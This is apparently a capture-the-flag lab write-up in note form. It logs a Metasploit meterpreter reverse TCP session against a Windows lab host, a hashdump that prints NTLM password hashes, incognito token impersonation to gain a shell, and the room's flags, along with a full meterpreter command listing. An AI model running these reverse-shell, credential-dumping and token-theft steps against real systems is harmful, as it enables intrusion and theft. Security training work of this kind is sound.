%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can use help to view all 
available commands
Metasploit Documentation: https://docs.metasploit.com/

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.8.19.103
lport => 1338
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.19.103:1338 
msf6 exploit(multi/handler) > [*] Sending stage (200774 bytes) to 10.10.40.206
[*] Meterpreter session 1 opened (10.8.19.103:1338 -> 10.10.40.206:50070) at 2023-07-22 18:25:14 -0400

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type             Information      Connection
  --  ----  ----             -----------      ----------
  1         meterpreter x64  NT AUTHORITY\SY  10.8.19.103:1338
            /windows         STEM @ WIN-8VMB   -> 10.10.40.206
                             KF3G815          :50070 (10.10.40
                                              .206)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Admin:1003:aad3b435b51404eeaad3b435b51404ee:25f46396c818314f78cafba3fd1e5596:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Equinox:1001:aad3b435b51404eeaad3b435b51404ee:e40d1ba38afa3fe8264af701b7ca9b7c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Sunlight:1002:aad3b435b51404eeaad3b435b51404ee:d54b9ad80935dd57769e8eae3e655927:::

https://www.offsec.com/metasploit-unleashed/fun-incognito/

PS C:\Users\Administrator\Desktop> cat C:\Users\Admin\Desktop\root.txt
PS C:\Users\Administrator\Desktop> cat : Cannot find path 'C:\Users\Admin\Desktop\root.txt' because it does not 
exist.
At line:1 char:1
+ cat C:\Users\Admin\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Admin\Desktop\root.txt 
   :String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetCo 
   ntentCommand

meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    bg            Alias for background
    bgkill        Kills a background meterpreter script
    bglist        Lists running background scripts
    bgrun         Executes a meterpreter script as a background thread
    channel       Displays information or control active channels
    close         Closes a channel
    detach        Detach the meterpreter session (for http/https)
    disable_unic  Disables encoding of unicode strings
    ode_encoding
    enable_unico  Enables encoding of unicode strings
    de_encoding
    exit          Terminate the meterpreter session
    get_timeouts  Get the current session timeout values
    guid          Get the session GUID
    help          Help menu
    info          Displays information about a Post module
    irb           Open an interactive Ruby shell on the current session
    load          Load one or more meterpreter extensions
    machine_id    Get the MSF ID of the machine attached to the session
    migrate       Migrate the server to another process
    pivot         Manage pivot listeners
    pry           Open the Pry debugger on the current session
    quit          Terminate the meterpreter session
    read          Reads data from a channel
    resource      Run the commands stored in a file
    run           Executes a meterpreter script or Post module
    secure        (Re)Negotiate TLV packet encryption on the session
    sessions      Quickly switch to another session
    set_timeouts  Set the current session timeout values
    sleep         Force Meterpreter to go quiet, then re-establish session
    ssl_verify    Modify the SSL certificate verification setting
    transport     Manage the transport mechanisms
    use           Deprecated alias for "load"
    uuid          Get the UUID for the current session
    write         Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    enumdesktops  List all accessible desktops and window stations
    getdesktop    Get the current meterpreter desktop
    idletime      Returns the number of seconds the remote user has been idle
    keyboard_sen  Send keystrokes
    d
    keyevent      Send key events
    keyscan_dump  Dump the keystroke buffer
    keyscan_star  Start capturing keystrokes
    t
    keyscan_stop  Stop capturing keystrokes
    mouse         Send mouse events
    screenshare   Watch the remote user desktop in real time
    screenshot    Grab a screenshot of the interactive desktop
    setdesktop    Change the meterpreters current desktop
    uictl         Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command       Description
    -------       -----------
    record_mic    Record audio from the default microphone for X seconds
    webcam_chat   Start a video chat
    webcam_list   List webcams
    webcam_snap   Take a snapshot from the specified webcam
    webcam_strea  Play a video stream from the specified webcam
    m


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


Incognito Commands
==================

    Command       Description
    -------       -----------
    add_group_us  Attempt to add a user to a global group with all tokens
    er
    add_localgro  Attempt to add a user to a local group with all tokens
    up_user
    add_user      Attempt to add a user with all tokens
    impersonate_  Impersonate specified token
    token
    list_tokens   List tokens available under current user context
    snarf_hashes  Snarf challenge/response hashes for every token

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-8VMBKF3G815\Admin
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
[+] Delegation token available
[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
meterpreter > shell
Process 5084 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

E:\xampp\htdocs\internal>whoami
whoami
win-8vmbkf3g815\admin

E:\xampp\htdocs\internal>dir C:\Users\Admin\Desktop
dir C:\Users\Admin\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 7805-3F28

 Directory of C:\Users\Admin\Desktop

04/12/2020  01:17 AM    <DIR>          .
04/12/2020  01:17 AM    <DIR>          ..
03/28/2020  12:39 PM                37 root.txt
               1 File(s)             37 bytes
               2 Dir(s)  39,239,380,992 bytes free

E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
type C:\Users\Admin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}


```


![[Pasted image 20230722161811.png]]

user.txt  

*thm{09b408056a13fc222f33e6e4cf599f8c}*

root.txt 

*thm{a1f936a086b367761cc4e7dd6cd2e2bd}*




[[Fusion Corp]]